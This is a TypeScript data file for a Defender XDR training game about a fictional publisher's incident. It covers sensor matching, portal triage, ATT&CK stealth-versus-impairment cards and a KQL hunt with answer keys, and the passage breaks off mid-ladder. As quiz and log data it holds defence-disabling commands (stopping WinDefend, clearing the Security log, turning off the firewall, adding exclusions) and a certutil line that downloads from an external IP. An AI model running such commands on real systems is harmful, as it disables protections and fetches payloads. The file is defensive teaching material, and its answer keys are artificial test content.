import type { RoomExperience } from "./types";

// "Operation Last Word" for the "defender-xdr" room.
// Script: docs/campaign/58-defender-xdr.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Fenwick & Ash Publishers (fictional), not the graded tasks' corp.com records.
// Signature mechanics: a Defender-style portal with a playable attack story and pending
// remediation approvals, and the Query Ladder, a KQL console where every result is computed.
// Game mix: deduce + duel + hunt + intercept + portal + rush.
// Live Response in the portal uses the real commands (connections, processes), as reading r1 does.
// Lab data differs from the graded tasks: the incident has 9 alerts and 2 devices (q3 has 12
// and 4); the unmanaged-host move is LDAP recon, never Kerberos tickets (q1); Live Response
// runs a command, never collects a file (r1 checkpoint); the anatomy is PsExec without -s by a
// named admin, never SRV-FILE01, svc-backup or a SYSTEM shell (la1, f1); the ladder joins
// process and file events to find certutil, never process and network events (q2) or encoded
// PowerShell (q4); the relayed sign-in ends in an inbox rule, and the consent sheet is a
// calendar app reading files, never a mail app after a risky sign-in (ac1).

export const DEFENDER_XDR: RoomExperience = {
  roomId: "defender-xdr",
  codename: "Operation Last Word",
  theme: "lastword",
  handler: { name: "Nkechi Holloway", role: "SOC Lead, Fenwick & Ash Publishers" },
  briefing: [
    "Fenwick & Ash Publishers. 180 people, one Microsoft tenant, and nine days until the most guarded book in the building goes on sale.",
    "The Last Word is a former minister's memoir, and a newspaper has already offered money for an early copy.",
    "This morning one portal lit up with alerts from email, a laptop and the directory, and Nkechi Holloway has to know whether they are nine problems or one.",
    "Learn what each sensor can see, read the incident as a story, hunt where no alert fired, and get the final call right.",
  ],
  mission: "Name which sensor sees each move, work a live incident in the portal, read a remote process record, sort hiding from breaking, find a relayed sign-in, climb a KQL query to one row, triage the hunt hits, then give the last word on the graded case.",
  estimate: "~50 min",
  look: { primary: "#fbbf24", secondary: "#2dd4bf", warn: "#f43f5e" },
  scene: "facilitylastword",
  layout: "facility",
  stations: [
    {
      id: "incident",
      label: "The Incident",
      topic: "The four Defender products · device inventory · the incident page · Live Response",
      tagline: "Nine alerts, or one story?",
      building: "control",
      taskIds: ["def-xdr-r1", "def-xdr-q1", "def-xdr-q3"],
    },
    {
      id: "timeline",
      label: "The Timeline",
      topic: "The investigation workflow · PsExec, WMI, RDP · ATT&CK tactics · identity attacks · containment",
      tagline: "Start before the alert",
      building: "lab",
      taskIds: ["def-xdr-r2", "def-xdr-la1", "def-xdr-f1"],
    },
    {
      id: "hunt",
      label: "The Hunt",
      topic: "KQL · the Advanced Hunting tables · joins · custom detections · Secure Score",
      tagline: "Find what no alert caught",
      building: "office",
      taskIds: ["def-xdr-r3", "def-xdr-q2", "def-xdr-q4"],
    },
    {
      id: "lastword",
      label: "Last Word",
      topic: "Weighing three signals into one verdict",
      tagline: "MFA passed. So what?",
      building: "ticket",
      taskIds: ["def-xdr-ac1"],
      boss: true,
    },
  ],
  personas: {
    "def-xdr-q1": { name: "Nkechi Holloway", role: "SOC Lead", line: "That laptop has no agent on it. So who saw this?" },
    "def-xdr-q3": { name: "Nkechi Holloway", role: "SOC Lead", line: "The board asks why we pay for one portal. What do I tell them?" },
    "def-xdr-la1": { name: "Nkechi Holloway", role: "SOC Lead", line: "Read the record, not the alert title." },
    "def-xdr-f1": { name: "Nkechi Holloway", role: "SOC Lead", line: "Give me the number I filter the timeline on." },
    "def-xdr-q2": { name: "Nkechi Holloway", role: "SOC Lead", line: "Which two tables get you there?" },
    "def-xdr-q4": { name: "Nkechi Holloway", role: "SOC Lead", line: "Forty rows came back. Where do you spend your morning?" },
    "def-xdr-ac1": { name: "Nkechi Holloway", role: "SOC Lead", line: "Three signals, one account, and the publisher is on the phone. Your call." },
  },
  briefings: {
    // ── Reading 1: four sensors, one portal ──
    "def-xdr-r1": [
      {
        kind: "duel",
        title: "Who Saw It?",
        prompt: "Four moves from this week's intruder. For each one, play the Defender product that actually has eyes on it. A product can't report what it never saw, and two of your cards see nothing at all.",
        attacker: "The intruder",
        moves: [
          { id: "m1", move: "A link and an attachment land in an editor's inbox", detail: "The link is rewritten and checked at click time. The attachment is opened in a sandbox first.", counter: "mdo", hint: "Which product sits on the mail?", why: "Email, Teams links and attachments belong to Defender for Office 365. Safe Links and Safe Attachments do the checking, and Threat Explorer shows who else got it." },
          { id: "m2", move: "rundll32 starts on an onboarded laptop and injects into another process", detail: "No file is written. The behaviour happens inside the operating system.", counter: "mde", hint: "Which product runs on the device itself?", why: "Only a sensor on the device sees process behaviour. That is Defender for Endpoint: EDR telemetry, risk score, and the Timeline." },
          { id: "m3", move: "A forgotten print server, no agent on it, runs LDAP queries for every admin account", detail: "Nothing runs on any device you manage. The only trace is what the queries touch.", counter: "mdi", hint: "What answers an LDAP query, whoever sends it?", why: "A domain controller answers LDAP whether or not the caller has an agent. Defender for Identity watches that traffic from the DC, so an unmanaged host doesn't hide from it." },
          { id: "m4", move: "A stolen session bulk-downloads 4 GB of proofs from the company's connected file-sharing app", detail: "It all happens inside a SaaS app, from a browser, on no company device.", counter: "mdca", hint: "Which product watches SaaS apps?", why: "Defender for Cloud Apps sees activity in the SaaS apps connected to it, plus traffic from managed networks and devices for Shadow IT. A personal account on an unmanaged device would stay out of its sight." },
        ],
        cards: [
          { id: "mdo", name: "Defender for Office 365", effect: "Mail, Teams, SharePoint, OneDrive." },
          { id: "score", name: "Secure Score", effect: "Measures posture. Detects nothing." },
          { id: "mde", name: "Defender for Endpoint", effect: "A sensor on each onboarded device." },
          { id: "mdca", name: "Defender for Cloud Apps", effect: "Shadow IT and SaaS behaviour." },
          { id: "mdi", name: "Defender for Identity", effect: "Sensors on domain controllers." },
          { id: "onboard", name: "Onboarding package", effect: "Installs the agent. Sees nothing itself." },
        ],
        lesson: "Each product sees one world: mail, devices, directory or SaaS apps. The question to ask is never 'which product is best' but 'whose sensor was close enough to see this?'",
      },
      {
        kind: "portal",
        title: "One Queue, One Story",
        prompt: "Monday, 10:05, Fenwick & Ash. Your name just went on the shift rota. Work the morning's incident in the portal the way Nkechi would: find it, read it, take it, approve only what the evidence supports, then deal with the laptop.",
        skin: "defender",
        product: "Security portal",
        resource: "Fenwick & Ash",
        tenant: "fenwickash.example",
        home: "home",
        menu: [
          { items: [{ id: "home", label: "Home" }] },
          { group: "Investigation & response", items: [{ id: "incidents", label: "Incidents" }, { id: "alerts", label: "Alerts" }] },
          { group: "Assets", items: [{ id: "devices", label: "Devices" }] },
          { group: "Exposure", items: [{ id: "score", label: "Secure Score" }] },
        ],
        pages: {
          home: {
            heading: "Home",
            tiles: [{ label: "Active incidents", value: "3" }, { label: "Devices at high risk", value: "2" }, { label: "Pending actions", value: "2" }],
            note: "Your work starts in the incident queue, not on this page.",
          },
          incidents: {
            heading: "Incidents",
            filters: ["Status: Active", "Last 7 days"],
            table: {
              columns: ["Incident name", "Incident Id", "Severity", "Priority score", "Active alerts", "Impacted assets", "Service sources", "Assigned to"],
              rows: [
                { id: "inc-7738", cells: ["Email reported by user as malware or phish", "7738", "Informational", "4", "1", "1 mailbox", "Office 365", "Automation"], tone: "info" },
                { id: "inc-7741", cells: ["Multi-stage incident on multiple endpoints reported by multiple sources", "7741", "High", "92", "9", "2 devices, 1 user, 1 mailbox", "Office 365, Endpoint, Identity", "Unassigned"], tone: "high", record: "inc7741" },
                { id: "inc-7735", cells: ["Unwanted software detected on one endpoint", "7735", "Low", "11", "1", "1 device", "Endpoint", "Unassigned"], tone: "low" },
              ],
            },
          },
          alerts: {
            heading: "Alerts",
            filters: ["Last 7 days"],
            note: "Each alert carries a severity, a detection source, a MITRE mapping and an affected entity. Grouped alerts share an incident ID.",
            table: {
              columns: ["Alert name", "Severity", "Detection source", "MITRE technique", "Entity", "Incident"],
              rows: [
                { id: "al-1", cells: ["Connection to a rare external address", "Medium", "EDR", "T1071", "FA-ED-LT14", "7741"], tone: "medium" },
                { id: "al-2", cells: ["Suspected remote execution through WMI", "High", "EDR", "T1047", "FA-PROD-SRV2", "7741"], tone: "high" },
                { id: "al-3", cells: ["Reconnaissance using LDAP queries", "Medium", "Defender for Identity", "T1087", "r.ashworth", "7741"], tone: "medium" },
              ],
            },
          },
          devices: {
            heading: "Devices",
            filters: ["Device inventory"],
            note: "Risk level comes from active alerts and missing patches. Exposure shows how open a device is to known techniques. A device marked 'Can be onboarded' has no agent, so it sends no telemetry.",
            table: {
              columns: ["Device name", "Risk level", "Exposure level", "OS", "Onboarding status", "Last seen"],
              rows: [
                { id: "dev-print", cells: ["FA-PRINT-02", "No data", "No data", "Windows Server 2012 R2", "Can be onboarded", "Seen by a neighbour device"], tone: "info" },
                { id: "dev-dc", cells: ["FA-DC01", "Low", "Low", "Windows Server 2022", "Onboarded", "2 min ago"], tone: "low" },
                { id: "dev-lt14", cells: ["FA-ED-LT14", "High", "Medium", "Windows 11 23H2", "Onboarded", "1 min ago"], tone: "high", record: "lt14" },
                { id: "dev-srv2", cells: ["FA-PROD-SRV2", "High", "Medium", "Windows Server 2022", "Onboarded", "1 min ago"], tone: "high" },
                { id: "dev-scan", cells: ["FA-SCAN-SRV1", "Low", "Low", "Windows Server 2022", "Onboarded", "3 min ago"], tone: "low" },
              ],
            },
          },
          score: {
            heading: "Secure Score",
            tiles: [{ label: "Secure Score", value: "412 / 640" }, { label: "Devices onboarded", value: "96%" }, { label: "ASR rules on", value: "71%" }],
            note: "A posture measure, tracked as a KPI. Nothing on this page is an alert.",
          },
        },
        records: {
          inc7741: {
            id: "7741",
            title: "Multi-stage incident on multiple endpoints",
            strip: [
              { field: "status", label: "Status", value: "Active", tone: "high", options: ["Active", "In progress", "Resolved"] },
              { field: "assigned", label: "Assigned to", value: "Unassigned", options: ["Assign to me"] },
            ],
            facts: [["First activity", "Mon 08:12"], ["Last activity", "Mon 09:48"], ["Categories", "Initial access, Execution, Discovery, Lateral movement, Collection"], ["Service sources", "Office 365, Endpoint, Identity"]],
            evidence: [["Alerts", "9"], ["Devices", "2"], ["Users", "1"], ["Mailboxes", "1"]],
            tactics: "Initial Access, Execution, Discovery, Lateral Movement, Collection",
            timeline: [
              { time: "08:12", text: "Office 365: malicious attachment removed after delivery", tone: "medium" },
              { time: "08:31", text: "Endpoint: Word started a suspicious child process", tone: "high" },
              { time: "08:32", text: "Endpoint: suspicious rundll32 behaviour", tone: "high" },
              { time: "08:40", text: "Endpoint: connection to a rare external address", tone: "medium" },
              { time: "09:05", text: "Identity: reconnaissance using LDAP queries", tone: "medium" },
              { time: "09:21", text: "Identity: suspicious sign-in to a server", tone: "medium" },
              { time: "09:23", text: "Endpoint: suspected remote execution through WMI", tone: "high" },
              { time: "09:40", text: "Endpoint: mass read of the Manuscripts share", tone: "high" },
              { time: "09:48", text: "Endpoint: archive created in a temp folder", tone: "high" },
            ],
            graph: {
              nodes: [
                { id: "mail", label: "proof_corrections.docm", type: "mail", x: 12, y: 22, order: 1, alerted: true, facts: [["Sender", "corrections@proofdesk.example"], ["Delivered", "08:12, removed from the mailbox at 08:44"], ["Source", "Defender for Office 365"]] },
                { id: "user", label: "r.ashworth", type: "user", x: 34, y: 62, order: 2, facts: [["Role", "Senior editor, Non-fiction"], ["Risk", "High"], ["Source", "Defender for Identity"]] },
                { id: "lt14", label: "FA-ED-LT14", type: "device", x: 54, y: 22, order: 3, alerted: true, facts: [["Risk level", "High"], ["Alerts", "3"], ["Source", "Defender for Endpoint"]] },
                { id: "ip", label: "198.51.100.77", type: "ip", x: 84, y: 16, order: 4, alerted: true, facts: [["Seen on", "1 device in this tenant"], ["First seen", "Mon 08:40"]] },
                { id: "srv", label: "FA-PROD-SRV2", type: "device", x: 78, y: 70, order: 5, alerted: true, facts: [["Role", "Production file server"], ["Alerts", "3"], ["Share", "\\\\FA-PROD-SRV2\\Manuscripts"]] },
              ],
              edges: [["mail", "user"], ["user", "lt14"], ["lt14", "ip"], ["lt14", "srv"]],
            },
            logs: {
              query: "",
              columns: ["Alert", "Severity", "Service source", "Entity"],
              rows: [
                { id: "a1", cells: ["Malicious attachment removed after delivery", "Medium", "Office 365", "r.ashworth mailbox"] },
                { id: "a2", cells: ["Word started a suspicious child process", "High", "Endpoint", "FA-ED-LT14"] },
                { id: "a3", cells: ["Suspicious rundll32 behaviour", "High", "Endpoint", "FA-ED-LT14"] },
                { id: "a4", cells: ["Connection to a rare external address", "Medium", "Endpoint", "FA-ED-LT14"] },
                { id: "a5", cells: ["Reconnaissance using LDAP queries", "Medium", "Identity", "r.ashworth"] },
                { id: "a6", cells: ["Suspicious sign-in to a server", "Medium", "Identity", "r.ashworth"] },
                { id: "a7", cells: ["Suspected remote execution through WMI", "High", "Endpoint", "FA-PROD-SRV2"] },
                { id: "a8", cells: ["Mass read of the Manuscripts share", "High", "Endpoint", "FA-PROD-SRV2"] },
                { id: "a9", cells: ["Archive created in a temp folder", "High", "Endpoint", "FA-PROD-SRV2"] },
              ],
            },
            entities: [
              { id: "lt14", label: "FA-ED-LT14", type: "Device", seen: "3 alerts" },
              { id: "srv", label: "FA-PROD-SRV2", type: "Device", seen: "3 alerts" },
              { id: "user", label: "r.ashworth", type: "User", seen: "2 alerts" },
            ],
            remediation: [
              { id: "ev1", entity: "6 messages with proof_corrections.docm", type: "Email cluster", verdict: "Malicious", action: "Soft delete email", detail: "Sandbox: macro starts rundll32. New sender domain." },
              { id: "ev2", entity: "2 messages from the Harrow print house", type: "Email cluster", verdict: "Suspicious", action: "Soft delete email", detail: "Same file type as the bad cluster. DKIM pass, sender on a live thread since 2022." },
            ],
          },
          lt14: {
            id: "dev-lt14",
            title: "FA-ED-LT14",
            actions: [
              { id: "scan", label: "Run antivirus scan" },
              { id: "isolate", label: "Isolate device" },
              { id: "live", label: "Initiate Live Response session" },
            ],
            banners: { isolate: "FA-ED-LT14 is isolated: every connection is cut except the one to the Defender service." },
            facts: [["Risk level", "High"], ["Exposure level", "Medium"], ["Logged-on user", "r.ashworth"], ["Onboarding status", "Onboarded"], ["Last seen", "1 min ago"]],
            timeline: [
              { time: "Mon 09:02", text: "rundll32.exe connected to 198.51.100.77:443", tone: "high" },
              { time: "Mon 08:40", text: "rundll32.exe connected to 198.51.100.77:443, first time", tone: "medium" },
              { time: "Mon 08:32", text: "rundll32.exe loaded cache.dat from AppData", tone: "high" },
              { time: "Mon 08:31", text: "WINWORD.EXE started rundll32.exe", tone: "high" },
              { time: "Mon 08:29", text: "r.ashworth opened proof_corrections.docm", tone: "info" },
            ],
            panes: {
              live: [["C:\\>", "connections"], ["TCP", "10.20.3.14:51188  198.51.100.77:443  SYN_SENT  6120"], ["C:\\>", "processes"], ["6120", "rundll32.exe  r.ashworth  ...\\AppData\\Local\\cache.dat"]],
            },
          },
        },
        steps: [
          { id: "queue", ask: "Open your work queue.", hint: "Incidents, under Investigation & response.", target: "menu:incidents", why: "An analyst works incidents, not single alerts. The queue is the first screen of the shift." },
          { id: "row", ask: "Open the incident that matters most this morning.", hint: "Read Severity, Priority score and Active alerts.", target: "row:inc-7741", why: "High severity, score 92, nine alerts from three products already tied together. Treated separately, those would be nine small tickets on three different screens." },
          { id: "play", ask: "Before reading alert by alert, replay what happened.", hint: "Play attack story, above the incident graph.", target: "action:play", why: "The graph builds in the order things happened. That is how you learn how the pieces connect." },
          { id: "start", ask: "Which node is where this began?", hint: "The first node that appeared when you played it.", target: "node:mail", why: "The email came first. The server has the loudest alerts, but it was the last stop." },
          { id: "take", ask: "Nobody owns this incident. Take it.", hint: "Assigned to, in Incident details on the right.", target: "set:assigned:Assign to me", why: "Ownership first. Two analysts on one incident, or none, is how time gets lost." },
          { id: "progress", ask: "Show the shift that it's being worked.", hint: "Status, in Incident details.", target: "set:status:In progress", why: "Status tells the rest of the team, and the metrics, that the clock is running on a person." },
          { id: "evtab", ask: "The automated investigation left actions waiting for a person. Find them.", hint: "The Evidence and Response tab.", target: "tab:evidence", why: "Automation decides a verdict and proposes a fix. Pending items wait for your approval." },
          { id: "approve", ask: "Approve the action the verdict supports.", hint: "Read the Verdict column.", target: "action:approve:ev1", why: "Sandbox result and a new sender: the verdict stands, and the deletion goes ahead." },
          { id: "reject", ask: "Now deal with the other pending action. Should those messages go?", hint: "Suspicious isn't a decision. Read the Evidence column.", target: "action:reject:ev2", why: "Suspicious means somebody should look, and you did. A signed sender on a three-year thread, flagged only because the file type matched: these are the print house's real proofs." },
          { id: "devices", ask: "The laptop is still calling out. Find it.", hint: "Devices, under Assets.", target: "menu:devices", why: "Device inventory shows every onboarded host with its risk and when it last checked in." },
          { id: "laptop", ask: "Open the laptop behind this incident.", hint: "The attack story named it.", target: "row:dev-lt14", why: "FA-ED-LT14: high risk, seen a minute ago. The print server above it says 'Can be onboarded', so it has no agent and no Timeline at all." },
          { id: "isolate", ask: "Stop it talking to the attacker, without losing it.", hint: "One of the buttons above the tabs.", target: "action:isolate", why: "Isolation is one click, and it keeps the device's link to the Defender service open." },
          { id: "live", ask: "Now see what's running on it, from your desk.", hint: "The remote shell, above the tabs.", target: "action:live", why: "The session opens even though the device is isolated, because it runs over the link isolation leaves open. SYN_SENT is the beacon trying and failing to reach its server: the attacker's connection is dead and yours isn't." },
        ],
        traps: {
          "row:inc-7738": "Informational, one alert, already with automation. The first row is not the first priority: read severity and priority score.",
          "row:inc-7735": "Low severity on one device. It can wait behind an incident with nine alerts across three products.",
          "action:approve:ev2": "You've just deleted real proofs from the print house, nine days before publication. Automation proposes and you check: this sender is signed and on a live thread.",
          "action:reject:ev1": "A sandbox result, a new sender, and the file that started all this. Rejecting leaves it sitting in six mailboxes.",
          "row:dev-dc": "The domain controller isn't in this incident's assets. Isolating it would take down sign-in for the whole company.",
          "row:dev-print": "This one has no agent, so there's nothing to open: no Timeline, no isolation, no Live Response. Note it for later.",
          "action:scan": "A scan takes minutes and won't show you what's running right now. Contain first, then look.",
        },
        lesson: "Choose by severity and score, not by position in the list. Read the story before the alerts, because the loudest alert is rarely the first event. A verdict is a proposal, so check the evidence behind it before you approve. Contain first, because isolation still leaves you a way in.",
      },
    ],
    // ── Reading 2: how you work an incident ──
    "def-xdr-r2": [
      {
        kind: "rush",
        title: "Hide or Break?",
        prompt: "ATT&CK v19 split the old Defense Evasion tactic in two. Stealth is staying unseen. Defense Impairment is damaging the thing that watches. Nkechi reads you lines from three timelines: call each one.",
        trueLabel: "Stealth",
        falseLabel: "Defense Impairment",
        target: 9,
        cards: [
          { id: "c1", text: "A payload saved as svchost.exe in a user's AppData folder", answer: true, why: "Masquerading: nothing is broken, it just looks like something it isn't." },
          { id: "c2", text: "sc stop WinDefend", answer: false, why: "Stopping the antivirus service damages the defence." },
          { id: "c3", text: "A signed Windows binary loads the attacker's code", answer: true, why: "A LOLBin blends into normal activity. Every defence is still running." },
          { id: "c4", text: "Add-MpPreference adds C:\\Temp as an exclusion", answer: false, why: "An exclusion switches the scanner off for that folder: a broken defence." },
          { id: "c5", text: "wevtutil cl Security", answer: false, why: "Clearing an event log removes what defenders rely on." },
          { id: "c6", text: "The dropper deletes itself after it has run", answer: true, why: "Removing your own tools is about not being found." },
          { id: "c7", text: "Code injected into a running browser process", answer: true, why: "Process injection hides code inside something legitimate." },
          { id: "c8", text: "netsh advfirewall set allprofiles state off", answer: false, why: "Turning the host firewall off removes a control." },
          { id: "c9", text: "auditpol disables logon auditing", answer: false, why: "Stopping the logging itself impairs the defence." },
          { id: "c10", text: "Payload hidden in a password-protected archive", answer: true, why: "The scanner still works. It just can't read inside." },
          { id: "c11", text: "A registry change disables the EDR sensor's service", answer: false, why: "A direct attack on the sensor." },
          { id: "c12", text: "certutil decodes a payload from a text file", answer: true, why: "A trusted tool doing the unpacking, to stay out of sight." },
        ],
        lesson: "Ask one question: is every defence still running? If it is, and the attacker is simply not being noticed, that is Stealth. If a control was switched off, excluded or wiped, that is Defense Impairment.",
      },
      {
        kind: "anatomy",
        title: "Anatomy of a Remote Process",
        prompt: "Before the graded record: Lewis West in IT ran a command on the scanning server yesterday, on purpose, with a ticket. Read it field by field. This is what remote execution looks like when it's fine.",
        source: "Advanced Hunting · DeviceProcessEvents · fa-scan-srv1",
        fields: [
          { key: "Timestamp", value: "2026-11-02T14:06:21Z", label: "When" },
          { key: "DeviceName", value: "fa-scan-srv1.fenwickash.example", label: "Where", note: "The target. The record lives on the machine the command ran on." },
          { key: "ActionType", value: "ProcessCreated" },
          { key: "FileName", value: "ipconfig.exe", label: "What ran" },
          { key: "ProcessCommandLine", value: "ipconfig /all" },
          { key: "AccountName", value: "adm-l.west", label: "As whom", note: "PsExec runs the command as the connecting account. Add its -s option and it runs as NT AUTHORITY\\SYSTEM instead." },
          { key: "InitiatingProcessFileName", value: "PSEXESVC.exe", label: "Parent", note: "PsExec copies this service binary to the target and starts it. Only a local administrator can do that." },
          { key: "InitiatingProcessId", value: "2960", label: "Parent PID", note: "Filter the device Timeline on this number to see everything else this service did: other children, files written, connections." },
          { key: "InitiatingProcessParentFileName", value: "services.exe", note: "Why PSEXESVC runs at all: it was started as a service." },
        ],
        summary: "PsExec leaves a shape: on the target, the command is a child of PSEXESVC.exe, which is a child of services.exe. The account tells you who connected, or that -s was used. The parent PID is the thread to pull. This record can't say where the connection came from: DeviceLogonEvents can, in RemoteIP. Here it is IT's jump host, which is why it's fine. A familiar name proves nothing on its own, so judge it by where it came from and what it did. WMI, RDP and SMB leave different shapes, and those questions work for all of them.",
      },
      {
        kind: "deduce",
        title: "Which Sign-In Was Relayed?",
        prompt: "Six sign-ins from this morning, five of them successful, and one of the five isn't the person it claims to be. A phishing page relayed the real sign-in: the user typed their own password and approved their own prompt. Strike them out as Nkechi reads the clues.",
        nameColumn: "User",
        columns: ["Risk", "MFA", "IP seen before?", "Device", "Next 10 minutes"],
        suspects: [
          { id: "marsh", name: "g.okafor", cells: ["None", "Approved", "Yes", "Managed", "Read mail"] },
          { id: "obi", name: "h.obi", cells: ["High", "Denied", "No", "Unmanaged", "Nothing: sign-in stopped"] },
          { id: "lund", name: "t.lund", cells: ["Medium", "Approved", "No, a Lisbon hotel", "Managed", "Opened the book fair folder"] },
          { id: "varga", name: "p.szabo", cells: ["Low", "Approved", "No", "Unmanaged", "Created an inbox rule"] },
          { id: "ibe", name: "c.ibe", cells: ["High", "Approved", "No, new VPN exit", "Managed", "Read mail"] },
          { id: "frost", name: "d.frost", cells: ["None", "Not required", "Yes, office", "Managed", "Opened a spreadsheet"] },
        ],
        clues: [
          "The password and the prompt both went through, so MFA was approved.",
          "A relay hands the attacker the session, and it replays that from a machine Fenwick & Ash doesn't manage.",
          "The session then did something the user has never done, and it wasn't reading a book fair folder.",
        ],
        culprit: "varga",
        why: "p.szabo's risk was only Low, and that's the point: a relayed sign-in looks like a success with MFA, so 'MFA approved' proves a prompt was answered, not who ended up with the session. An unfamiliar IP on an unmanaged device, followed by an inbox rule, is the pattern. t.lund and c.ibe are the near misses: new addresses, but on managed devices doing their normal work. To contain it, reset the password and revoke sessions, because a password reset alone leaves the stolen session alive.",
      },
      {
        kind: "worksheet",
        title: "Which App Gets Revoked?",
        prompt: "Sign-ins aren't the only way into a mailbox or a drive. An app that a user approves gets its own tokens. Four consent grants from Fenwick & Ash's audit log this week: read each one as Nkechi would.",
        caption: "Audit log · Consent to application · last 7 days",
        columns: ["App", "Publisher", "First seen in tenant", "Permissions asked for", "Consented by"],
        rows: [
          ["Teams Meeting Notes", "Verified publisher", "2024-03", "User.Read", "42 users"],
          ["Print Portal Sync", "Verified publisher", "2023-09", "Files.Read.Selected", "IT admin"],
          ["CalSync Pro", "Unverified", "Today", "Files.Read.All", "a.bell"],
          ["Survey Helper", "Verified publisher", "2025-11", "User.Read, offline_access", "6 users"],
        ],
        questions: [
          { id: "app", q: "Which grant would you pull first?", hint: "A calendar tool, new today, from nobody you can verify. Compare what it does with what it asks for.", answer: ["CalSync Pro", "CalSync"], why: "No verified publisher, first seen today, one consent, and a calendar tool asking to read every file. Each of those is weak alone. Together they are the shape of consent phishing." },
          { id: "reset", q: "a.bell resets their password. Can CalSync Pro still read the files? (yes/no)", hint: "Who holds the tokens: the user or the app?", answer: ["yes"], why: "The app holds its own tokens, separate from the password. They keep working until an admin revokes the consent." },
        ],
      },
    ],
    // ── Reading 3: hunting ──
    "def-xdr-r3": [
      {
        kind: "hunt",
        title: "The Query Ladder",
        prompt: "No alert fired on this one. Nkechi has a tip: somebody is using certutil, a built-in Windows tool, to pull files from the internet, and only when Office starts it. Build the hunt one line at a time. Every result you see is really what that line returns.",
        language: "KQL",
        start: "DeviceProcessEvents",
        goal: "one row: the file Office made certutil fetch",
        tables: [
          {
            name: "DeviceProcessEvents",
            note: "Process creation.",
            columns: ["Timestamp", "DeviceName", "AccountName", "FileName", "ProcessCommandLine", "InitiatingProcessFileName", "ProcessId"],
            rows: [
              ["11-02 22:10", "fa-ed-lt03", "a.bell", "certutil.exe", "certutil -hashfile patch.msi SHA256", "cmd.exe", "4410"],
              ["11-03 02:14", "fa-it-wk02", "adm-l.west", "certutil.exe", "certutil -verify root.cer", "IntuneManagementExtension.exe", "9120"],
              ["11-03 09:02", "fa-mk-lt07", "j.moss", "certutil.exe", "certutil -urlcache -f http://fonts.fenwickash.example/f.zip f.zip", "powershell.exe", "7302"],
              ["11-03 11:37", "fa-ed-lt09", "s.nowak", "notepad.exe", "notepad certutil_notes.txt", "explorer.exe", "5588"],
              ["11-04 08:41", "fa-ed-lt09", "s.nowak", "certutil.exe", "certutil -urlcache -f http://198.51.100.90/a.dat a.dat", "WINWORD.EXE", "6204"],
              ["11-04 08:41", "fa-ed-lt09", "s.nowak", "WINWORD.EXE", "WINWORD.EXE /n contract_v4.docm", "explorer.exe", "6188"],
              ["11-04 12:15", "fa-fin-lt02", "b.reed", "excel.exe", "EXCEL.EXE budget.xlsx", "explorer.exe", "3390"],
            ],
          },
          {
            name: "DeviceFileEvents",
            note: "Files created, changed, deleted.",
            columns: ["Timestamp", "DeviceName", "FileName", "FolderPath", "ActionType", "InitiatingProcessId"],
            rows: [
              ["11-03 09:02", "fa-mk-lt07", "f.zip", "C:\\Users\\j.moss\\Downloads\\f.zip", "FileCreated", "7302"],
              ["11-04 08:41", "fa-ed-lt09", "a.dat", "C:\\Users\\s.nowak\\AppData\\Local\\Temp\\a.dat", "FileCreated", "6204"],
              ["11-04 08:55", "fa-it-wk02", "inventory.csv", "C:\\ProgramData\\Agent\\inventory.csv", "FileCreated", "6204"],
              ["11-04 08:40", "fa-ed-lt09", "contract_v4.docm", "C:\\Users\\s.nowak\\Downloads\\contract_v4.docm", "FileCreated", "4822"],
              ["11-04 12:16", "fa-fin-lt02", "budget.xlsx", "C:\\Users\\b.reed\\Documents\\budget.xlsx", "FileModified", "3390"],
            ],
          },
          {
            name: "DeviceLogonEvents",
            note: "Sign-ins on a device.",
            columns: ["Timestamp", "DeviceName", "AccountName", "LogonType", "RemoteIP"],
            rows: [
              ["11-04 08:02", "fa-ed-lt09", "s.nowak", "Interactive", "-"],
              ["11-04 08:02", "fa-ed-lt09", "s.nowak", "Unlock", "-"],
            ],
          },
        ],
        rungs: [
          {
            id: "tool", ask: "Line 2: keep only the certutil processes.",
            choices: [
              { id: "a", text: '| where FileName == "certutil"', why: "No rows: FileName holds the whole name, with .exe, and == must match it exactly.", apply: { op: "where", col: "FileName", test: "eq", value: "certutil" } },
              { id: "b", text: '| where ProcessCommandLine has "certutil"', why: "Too wide: notepad opening a file called certutil_notes matched. Filter on what ran, not on what the command line mentions.", apply: { op: "where", col: "ProcessCommandLine", test: "has", value: "certutil" } },
              { id: "c", text: '| where FileName =~ "certutil.exe"', right: true, why: "=~ ignores case, so CERTUTIL.EXE would match too. Four rows left.", apply: { op: "where", col: "FileName", test: "ieq", value: "certutil.exe" } },
            ],
          },
          {
            id: "use", ask: "Line 3: certutil has honest uses. Keep only the ones that download.",
            choices: [
              { id: "a", text: '| where ProcessCommandLine has "-urlcache"', right: true, why: "-urlcache -f fetches a URL to a file. Hashing and verifying are what the tool is for, and they're gone now.", apply: { op: "where", col: "ProcessCommandLine", test: "has", value: "-urlcache" } },
              { id: "b", text: '| where ProcessCommandLine has "-hashfile"', why: "That keeps the honest use and throws away the one you want.", apply: { op: "where", col: "ProcessCommandLine", test: "has", value: "-hashfile" } },
              { id: "c", text: '| where FileName has "urlcache"', why: "FileName is the program's name. The switch is in the command line.", apply: { op: "where", col: "FileName", test: "has", value: "urlcache" } },
            ],
          },
          {
            id: "parent", ask: "Line 4: the tip says Office starts it. Filter on who launched it.",
            choices: [
              { id: "a", text: '| where AccountName in~ ("s.nowak", "j.moss")', why: "You just chose by the answer you can see. A rule has to work tomorrow, on names you haven't met.", apply: { op: "where", col: "AccountName", test: "in", value: ["s.nowak", "j.moss"] } },
              { id: "b", text: '| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "outlook.exe")', right: true, why: "The parent is the tell, and the tip is about Office. The PowerShell row is a separate lead: note it and check it later.", apply: { op: "where", col: "InitiatingProcessFileName", test: "in", value: ["winword.exe", "excel.exe", "outlook.exe"] } },
              { id: "c", text: '| where InitiatingProcessFileName !in~ ("winword.exe", "excel.exe")', why: "That's the opposite: it drops the Office parents and keeps the rest.", apply: { op: "where", col: "InitiatingProcessFileName", test: "notin", value: ["winword.exe", "excel.exe"] } },
            ],
          },
          {
            id: "join", ask: "Line 5: a process table can't say what was written. Bring in the table that can.",
            choices: [
              { id: "a", text: "| join kind=inner DeviceLogonEvents on AccountName", why: "That tells you when the user signed in, not what the process wrote.", apply: { op: "join", table: "DeviceLogonEvents", left: "AccountName", right: "AccountName" } },
              { id: "b", text: "| join kind=inner DeviceFileEvents on DeviceName", why: "Joined on the device only, so every file on that laptop came along. Match the process itself.", apply: { op: "join", table: "DeviceFileEvents", left: "DeviceName", right: "DeviceName" } },
